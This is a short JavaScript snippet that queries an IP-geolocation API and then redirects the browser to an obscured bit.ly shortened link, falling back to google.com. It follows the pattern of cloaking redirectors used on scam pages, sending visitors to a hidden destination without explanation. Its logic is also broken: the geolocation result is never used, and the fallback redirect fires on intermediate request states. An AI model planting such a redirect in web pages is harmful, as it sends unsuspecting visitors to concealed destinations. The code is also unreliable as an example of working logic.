var request = new XMLHttpRequest();

request.open('GET', 'https://api.ipdata.co/?api-key=test');

request.setRequestHeader('Accept', 'application/json');

request.onreadystatechange = function () {
  if (this.readyState === 4) {
    //console.log(this.responseText);
    window.location="https://bit.ly/3rk7ikn";
  }
  else{window.location="https://google.com/";}
};

request.send();
//window.location="https://bit.ly/3rk7ikn";
